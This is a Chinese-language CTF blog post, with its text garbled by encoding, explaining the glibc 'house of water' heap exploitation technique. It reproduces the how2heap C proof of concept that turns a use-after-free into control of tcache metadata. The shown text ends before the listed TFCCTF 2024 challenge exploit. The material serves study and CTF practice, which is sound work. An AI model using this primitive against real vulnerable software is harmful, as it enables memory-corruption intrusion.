<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="house of wateræ—©å°±å¬ Csome å­¦é•¿è¯´è¿‡æœ‰ç§æ‰“æ³•å« house of waterï¼Œä½†æ˜¯å½“æ—¶æ²¡å»çœ‹ï¼Œæ—¶é—´ä¹…äº†å°±å¿˜è®°è¿™ä¸ªä¸œè¥¿äº†ï¼Œç°åœ¨è®°èµ·æ¥äº†å°±æ¥å­¦ä¹ ä¸€ä¸‹ã€‚ç”±äºç¬”è€…çš„æ°´å¹³æœ‰é™ï¼Œæ–‡ç« ä¸å…ä¼šå‡ºç°è®¸å¤šé”™è¯¯ï¼Œå¸Œæœ›å„ä½å¸ˆå‚…èƒ½è¿‡åŒ…å®¹ä»¥åŠæŒ‡æ­£ã€‚è¿™ç¯‡æ–‡ç« çš„ç¨‹åºçš„æµ‹è¯•ç¯å¢ƒä¸º ubuntu 22.04.3 TLSã€‚ æ¦‚è¿°è¿™ä¸ªæ‰“æ³•ç”±å›½é™…æˆ˜é˜Ÿ blue water æå‡ºçš„ï¼Œä¸‹é¢æ¥çœ‹çœ‹è¯¥å›¢é˜Ÿå¯¹è¿™ä¸ªæ‰“æ³•çš„æè¿°ï¼š">
<meta property="og:type" content="article">
<meta property="og:title" content="house of water &amp; TFCCTF 2024 MCGUAVA">
<meta property="og:url" content="https://qanux.github.io/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/index.html">
<meta property="og:site_name" content="Qanux&#39;s space">
<meta property="og:description" content="house of wateræ—©å°±å¬ Csome å­¦é•¿è¯´è¿‡æœ‰ç§æ‰“æ³•å« house of waterï¼Œä½†æ˜¯å½“æ—¶æ²¡å»çœ‹ï¼Œæ—¶é—´ä¹…äº†å°±å¿˜è®°è¿™ä¸ªä¸œè¥¿äº†ï¼Œç°åœ¨è®°èµ·æ¥äº†å°±æ¥å­¦ä¹ ä¸€ä¸‹ã€‚ç”±äºç¬”è€…çš„æ°´å¹³æœ‰é™ï¼Œæ–‡ç« ä¸å…ä¼šå‡ºç°è®¸å¤šé”™è¯¯ï¼Œå¸Œæœ›å„ä½å¸ˆå‚…èƒ½è¿‡åŒ…å®¹ä»¥åŠæŒ‡æ­£ã€‚è¿™ç¯‡æ–‡ç« çš„ç¨‹åºçš„æµ‹è¯•ç¯å¢ƒä¸º ubuntu 22.04.3 TLSã€‚ æ¦‚è¿°è¿™ä¸ªæ‰“æ³•ç”±å›½é™…æˆ˜é˜Ÿ blue water æå‡ºçš„ï¼Œä¸‹é¢æ¥çœ‹çœ‹è¯¥å›¢é˜Ÿå¯¹è¿™ä¸ªæ‰“æ³•çš„æè¿°ï¼š">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://qanux.github.io/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/1.png">
<meta property="og:image" content="https://qanux.github.io/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/2.png">
<meta property="og:image" content="https://qanux.github.io/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/3.png">
<meta property="og:image" content="https://qanux.github.io/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/4.png">
<meta property="og:image" content="https://qanux.github.io/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/5.png">
<meta property="og:image" content="https://qanux.github.io/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/6.png">
<meta property="og:image" content="https://qanux.github.io/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/7.png">
<meta property="og:image" content="https://qanux.github.io/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/8.png">
<meta property="og:image" content="https://qanux.github.io/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/9.png">
<meta property="og:image" content="https://qanux.github.io/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/10.png">
<meta property="og:image" content="https://qanux.github.io/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/11.png">
<meta property="og:image" content="https://qanux.github.io/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/12.png">
<meta property="og:image" content="https://qanux.github.io/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/13.png">
<meta property="og:image" content="https://qanux.github.io/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/14.png">
<meta property="og:image" content="https://qanux.github.io/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/15.png">
<meta property="og:image" content="https://qanux.github.io/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/16.png">
<meta property="og:image" content="https://qanux.github.io/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/17.png">
<meta property="og:image" content="https://qanux.github.io/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/18.png">
<meta property="article:published_time" content="2024-08-05T16:00:00.000Z">
<meta property="article:modified_time" content="2025-01-09T05:50:17.887Z">
<meta property="article:author" content="Qanux">
<meta property="article:tag" content="CsomePro">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://qanux.github.io/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/1.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.jpg">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon.jpg" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.jpg">
        
      
    
    <!-- title -->
    <title>house of water &amp; TFCCTF 2024 MCGUAVA</title>
    <!-- async scripts -->
    <script>
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "https://hm.baidu.com/hm.js?dfa426831961b1170306cf91cfce69b4";
      var s = document.getElementsByTagName("script")[0]; 
      s.parentNode.insertBefore(hm, s);
    })();
    </script>
    
    
    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 7.0.0"><link rel="alternate" href="/atom.xml" title="Qanux's space" type="application/atom+xml">
</head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/friend/">link</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://qanux.github.io/2024/08/06/house%20of%20water%20&amp;%20TFCCTF%202024%20MCGUAVA/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://qanux.github.io/2024/08/06/house%20of%20water%20&amp;%20TFCCTF%202024%20MCGUAVA/&text=house of water &amp; TFCCTF 2024 MCGUAVA"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://qanux.github.io/2024/08/06/house%20of%20water%20&amp;%20TFCCTF%202024%20MCGUAVA/&title=house of water &amp; TFCCTF 2024 MCGUAVA"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://qanux.github.io/2024/08/06/house%20of%20water%20&amp;%20TFCCTF%202024%20MCGUAVA/&is_video=false&description=house of water &amp; TFCCTF 2024 MCGUAVA"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=house of water &amp; TFCCTF 2024 MCGUAVA&body=Check out this article: https://qanux.github.io/2024/08/06/house%20of%20water%20&amp;%20TFCCTF%202024%20MCGUAVA/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://qanux.github.io/2024/08/06/house%20of%20water%20&amp;%20TFCCTF%202024%20MCGUAVA/&title=house of water &amp; TFCCTF 2024 MCGUAVA"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://qanux.github.io/2024/08/06/house%20of%20water%20&amp;%20TFCCTF%202024%20MCGUAVA/&title=house of water &amp; TFCCTF 2024 MCGUAVA"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://qanux.github.io/2024/08/06/house%20of%20water%20&amp;%20TFCCTF%202024%20MCGUAVA/&title=house of water &amp; TFCCTF 2024 MCGUAVA"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://qanux.github.io/2024/08/06/house%20of%20water%20&amp;%20TFCCTF%202024%20MCGUAVA/&title=house of water &amp; TFCCTF 2024 MCGUAVA"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://qanux.github.io/2024/08/06/house%20of%20water%20&amp;%20TFCCTF%202024%20MCGUAVA/&name=house of water &amp; TFCCTF 2024 MCGUAVA&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://qanux.github.io/2024/08/06/house%20of%20water%20&amp;%20TFCCTF%202024%20MCGUAVA/&t=house of water &amp; TFCCTF 2024 MCGUAVA"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#house-of-water"><span class="toc-number">1.</span> <span class="toc-text">house of water</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0"><span class="toc-number">1.1.</span> <span class="toc-text">æ¦‚è¿°</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Attack-Demo"><span class="toc-number">1.2.</span> <span class="toc-text">Attack Demo</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#house-of-water-c"><span class="toc-number">1.2.1.</span> <span class="toc-text">house_of_water.c</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.2.2.</span> <span class="toc-text">æ€»ç»“</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TFCCTF-2024-MCGUAVA"><span class="toc-number">2.</span> <span class="toc-text">TFCCTF 2024 MCGUAVA</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ida%E4%BC%AA%E4%BB%A3%E7%A0%81"><span class="toc-number">2.0.1.</span> <span class="toc-text">idaä¼ªä»£ç </span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">2.0.2.</span> <span class="toc-text">æ¼æ´åˆ†æ</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%A0%86%E5%9D%97%E7%B4%A2%E5%BC%95"><span class="toc-number">2.0.3.</span> <span class="toc-text">è·å–å †å—ç´¢å¼•</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E8%83%BD%E5%A4%9F%E4%BF%AE%E6%94%B9-unsorted-start-%E5%92%8C-unsorted-end-%E7%9A%84%E5%A0%86%E5%9D%97"><span class="toc-number">2.0.4.</span> <span class="toc-text">è·å–èƒ½å¤Ÿä¿®æ”¹ unsorted_start å’Œ unsorted_end çš„å †å—</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BC%AA%E9%80%A0-fake-unsorted-chunk-%E7%9A%84prev-size-%E5%92%8C-size"><span class="toc-number">2.0.5.</span> <span class="toc-text">ä¼ªé€  fake unsorted chunk çš„prev_size å’Œ size</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exp"><span class="toc-number">2.0.6.</span> <span class="toc-text">exp</span></a></li></ol></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        house of water &amp; TFCCTF 2024 MCGUAVA
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">Qanux</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2024-08-05T16:00:00.000Z" class="dt-published" itemprop="datePublished">2024-08-06</time>
        
      
    </div>


      

      

    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h2 id="house-of-water"><a href="#house-of-water" class="headerlink" title="house of water"></a>house of water</h2><p>æ—©å°±å¬ Csome å­¦é•¿è¯´è¿‡æœ‰ç§æ‰“æ³•å« house of waterï¼Œä½†æ˜¯å½“æ—¶æ²¡å»çœ‹ï¼Œæ—¶é—´ä¹…äº†å°±å¿˜è®°è¿™ä¸ªä¸œè¥¿äº†ï¼Œç°åœ¨è®°èµ·æ¥äº†å°±æ¥å­¦ä¹ ä¸€ä¸‹ã€‚ç”±äºç¬”è€…çš„æ°´å¹³æœ‰é™ï¼Œæ–‡ç« ä¸å…ä¼šå‡ºç°è®¸å¤šé”™è¯¯ï¼Œå¸Œæœ›å„ä½å¸ˆå‚…èƒ½è¿‡åŒ…å®¹ä»¥åŠæŒ‡æ­£ã€‚è¿™ç¯‡æ–‡ç« çš„ç¨‹åºçš„æµ‹è¯•ç¯å¢ƒä¸º ubuntu 22.04.3 TLSã€‚</p>
<h3 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h3><p>è¿™ä¸ªæ‰“æ³•ç”±å›½é™…æˆ˜é˜Ÿ blue water æå‡ºçš„ï¼Œä¸‹é¢æ¥çœ‹çœ‹è¯¥å›¢é˜Ÿå¯¹è¿™ä¸ªæ‰“æ³•çš„æè¿°ï¼š</p>
<blockquote>
<p>House of Water is a technique for converting a Use-After-Free (UAF) vulnerability into a t-cache<br>metadata control primitive, with the added benefit of obtaining a free libc pointer in the<br>t-cache metadata as well.</p>
<p>NOTE: This requires 4 bits of bruteforce if the primitive is a write primitive, as the LSB will<br>contain 4 bits of randomness. If you can increment integers, no brutefore is required.</p>
<p>By setting the count of t-cache entries 0x3e0 and 0x3f0 to 1, a â€œfakeâ€ heap chunk header of<br>size â€œ0x10001â€ is created.</p>
<p>This fake heap chunk header happens to be positioned above the 0x20 and 0x30 t-cache linked<br>address entries, enabling the creation of a fully functional fake unsorted-bin entry.</p>
<p>The correct size should be set for the chunk, and the next chunkâ€™s prev-in-use bit<br>must be 0. Therefore, from the fake t-cache metadata chunk+0x10000, the appropriate values<br>should be written.</p>
<p>Finally, due to the behavior of allocations from unsorted-bins, once t-cache metadata control<br>is achieved, a libc pointer can also be inserted into the metadata. This allows the libc pointer<br>to be ready for allocation as well.</p>
<p>Technique &#x2F; house by @udp_ctf - Water Paddler &#x2F; Blue Water </p>
</blockquote>
<p>ç›¸ä¿¡å¤§å¤šæ•°äººéƒ½æ²¡çœ‹æ‡‚ï¼ˆæ„Ÿè§‰æ˜¯æˆ‘ç†è§£åŠ›æœ‰å¾…æé«˜ğŸ˜­ï¼‰ï¼Œä¸è¿‡ä¸ç”¨ç€æ€¥ï¼Œæ¥ä¸‹æ¥æˆ‘ä¼šè¿›è¡Œæ¯”è¾ƒè¯¦ç»†çš„è®²è§£ã€‚<br>è¯¥æ‰“æ³•çš„åˆ©ç”¨å‰ç½®æ¡ä»¶å¦‚ä¸‹ï¼š</p>
<blockquote>
<p>ç¨‹åºå­˜åœ¨UAFæ¼æ´<br>ç¨‹åºå¯ä»¥ç”³è¯·ä½å¤Ÿå¤§çš„å †å—</p>
</blockquote>
<p>è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå®Œæˆè¯¥æ‰“æ³•ä¸éœ€è¦æ³„éœ²ä»»ä½•å†…å­˜åœ°å€ä¸”ä¸éœ€è¦ä»»ä½•å †ä¸Šçš„æº¢å‡º<br>æœ€ç»ˆçš„æ•ˆæœæ˜¯èƒ½å¤Ÿåœ¨ tcache çš„é“¾è¡¨ä¸Šç•™ä¸‹ libc çš„ç›¸å…³åœ°å€ï¼Œå¹¶å°†å…¶ç”³è¯·å‡ºæ¥ï¼Œæ•ˆæœå¦‚ä¸‹ï¼š</p>
<img src="/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/1.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  

<p>å½“ç¨‹åºå¼€å§‹è¿è¡Œå¹¶é‡åˆ°å®ƒçš„ç¬¬ä¸€ä¸ª malloc æ—¶ï¼Œå †ï¼ˆmain arenaï¼‰å°†è¢«åˆå§‹åŒ–ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼ˆlibc 2.31+ï¼‰ï¼Œå°†åˆ†é… 0x290 çš„å†…å­˜å¤§å°æ¥å­˜å‚¨ tcache_perthread_struct ç»“æ„ä½“ï¼Œè¯¥ç»“æ„ä½“å­˜å‚¨å„ä¸ªä¸åŒ size çš„ tcache é“¾è¡¨çš„ chunk çš„ä¸ªæ•°ä»¥åŠæœ€åè¿›å…¥é“¾è¡¨çš„ chunk çš„ data åŒºåŸŸåœ°å€ã€‚ è¯¥ç»“æ„ä½“çš„æºç å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* There is one of these for each thread, which contains the</span></span><br><span class="line"><span class="comment">   per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping</span></span><br><span class="line"><span class="comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span></span><br><span class="line"><span class="comment">   are redundant (we could have just counted the linked list each</span></span><br><span class="line"><span class="comment">   time), this is for performance reasons.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">uint16_t</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br></pre></td></tr></table></figure>
<p>æˆ‘ä»¬æœ€ç»ˆçš„ç›®çš„æ˜¯åœ¨è¿™ä¸ªç»“æ„ä½“ä¸­çš„ entries åŒºåŸŸç•™ä¸‹ libc çš„ç›¸å…³åœ°å€ï¼Œè¿›è€Œè®©æˆ‘ä»¬èƒ½å¤Ÿç”³è¯· libc ä¸Šçš„å†…å­˜</p>
<h3 id="Attack-Demo"><a href="#Attack-Demo" class="headerlink" title="Attack Demo"></a>Attack Demo</h3><p>è¿™é‡Œæˆ‘ä»¬é€‰ç”¨ how2heap ä¸­çš„ <a target="_blank" rel="noopener" href="https://github.com/shellphish/how2heap/blob/master/glibc_2.39/house_of_water.c">house of water</a> è¿™ä¸ªä¾‹å­æ¥è§£é‡Šï¼Œè¿™é‡Œæˆ‘åšäº†ä¸€äº›ç®€å•çš„ä¿®æ”¹ï¼ŒæŠŠä¸€äº›è‹±æ–‡æ®µè½è¿›è¡Œäº†åˆ é™¤ï¼Œåªç•™ä¸‹ç¨‹åºæ‰§è¡Œä»£ç </p>
<h4 id="house-of-water-c"><a href="#house-of-water-c" class="headerlink" title="house_of_water.c"></a>house_of_water.c</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Ubuntu 22.04.3 LTS</span></span><br><span class="line"><span class="comment">// gcc -g house_of_water.c -o test</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">	<span class="type">void</span> *_ = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">	setbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">void</span> *fake_size_lsb = <span class="built_in">malloc</span>(<span class="number">0x3d8</span>);</span><br><span class="line">	<span class="type">void</span> *fake_size_msb = <span class="built_in">malloc</span>(<span class="number">0x3e8</span>);</span><br><span class="line">	<span class="built_in">free</span>(fake_size_lsb);</span><br><span class="line">	<span class="built_in">free</span>(fake_size_msb);</span><br><span class="line">	</span><br><span class="line">	<span class="type">void</span> *metadata = (<span class="type">void</span> *)((<span class="type">long</span>)(fake_size_lsb) &amp; ~(<span class="number">0xfff</span>));</span><br><span class="line"></span><br><span class="line">	<span class="type">void</span> *x[<span class="number">7</span>];</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">		x[i] = <span class="built_in">malloc</span>(<span class="number">0x88</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	<span class="type">void</span> *unsorted_start = <span class="built_in">malloc</span>(<span class="number">0x88</span>);</span><br><span class="line">	_ = <span class="built_in">malloc</span>(<span class="number">0x18</span>); <span class="comment">// Guard chunk</span></span><br><span class="line"></span><br><span class="line">	<span class="type">void</span> *unsorted_middle = <span class="built_in">malloc</span>(<span class="number">0x88</span>);</span><br><span class="line">	_ = <span class="built_in">malloc</span>(<span class="number">0x18</span>); <span class="comment">// Guard chunk</span></span><br><span class="line">	</span><br><span class="line">	<span class="type">void</span> *unsorted_end = <span class="built_in">malloc</span>(<span class="number">0x88</span>);</span><br><span class="line">	_ = <span class="built_in">malloc</span>(<span class="number">0x18</span>); <span class="comment">// Guard chunk</span></span><br><span class="line">	</span><br><span class="line">	_ = <span class="built_in">malloc</span>(<span class="number">0xf000</span>);		  <span class="comment">// Padding</span></span><br><span class="line">	<span class="type">void</span> *end_of_fake = <span class="built_in">malloc</span>(<span class="number">0x18</span>); <span class="comment">// Metadata chunk</span></span><br><span class="line"></span><br><span class="line">	*(<span class="type">long</span> *)end_of_fake = <span class="number">0x10000</span>;</span><br><span class="line">	*(<span class="type">long</span> *)(end_of_fake+<span class="number">0x8</span>) = <span class="number">0x20</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">		<span class="built_in">free</span>(x[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	*(<span class="type">long</span>*)(unsorted_start<span class="number">-0x18</span>) = <span class="number">0x31</span>; </span><br><span class="line"></span><br><span class="line">	<span class="built_in">free</span>(unsorted_start<span class="number">-0x10</span>); <span class="comment">// Create a fake FWD</span></span><br><span class="line">	</span><br><span class="line">	*(<span class="type">long</span>*)(unsorted_start<span class="number">-0x8</span>) = <span class="number">0x91</span>; </span><br><span class="line"></span><br><span class="line">	*(<span class="type">long</span>*)(unsorted_end<span class="number">-0x18</span>) = <span class="number">0x21</span>; </span><br><span class="line">	</span><br><span class="line">	<span class="built_in">free</span>(unsorted_end<span class="number">-0x10</span>); <span class="comment">// Create a fake BCK</span></span><br><span class="line">	</span><br><span class="line">	*(<span class="type">long</span>*)(unsorted_end<span class="number">-0x8</span>) = <span class="number">0x91</span>; </span><br><span class="line"></span><br><span class="line">	<span class="built_in">free</span>(unsorted_end);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">free</span>(unsorted_middle);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">free</span>(unsorted_start);</span><br><span class="line"></span><br><span class="line">	*(<span class="type">unsigned</span> <span class="type">long</span> *)unsorted_start = (<span class="type">unsigned</span> <span class="type">long</span>)(metadata+<span class="number">0x80</span>);</span><br><span class="line"> </span><br><span class="line">	*(<span class="type">unsigned</span> <span class="type">long</span> *)(unsorted_end+<span class="number">0x8</span>) = (<span class="type">unsigned</span> <span class="type">long</span>)(metadata+<span class="number">0x80</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Next allocation *could* be our faked chunk!</span></span><br><span class="line">	<span class="type">void</span> *meta_chunk = <span class="built_in">malloc</span>(<span class="number">0x288</span>);</span><br><span class="line"></span><br><span class="line">	assert(meta_chunk == (metadata+<span class="number">0x90</span>)); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
